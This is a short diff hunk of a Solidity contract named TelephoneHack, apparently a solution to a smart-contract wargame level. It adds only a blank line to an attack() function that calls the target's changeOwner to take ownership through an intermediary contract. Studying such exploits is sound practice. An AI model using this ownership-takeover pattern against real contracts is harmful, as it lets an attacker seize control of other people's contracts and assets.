@@ -12,6 +12,7 @@ contract TelephoneHack {
     }
 
     function attack() public {
+        
         Telephone(target).changeOwner(msg.sender);
     }
 
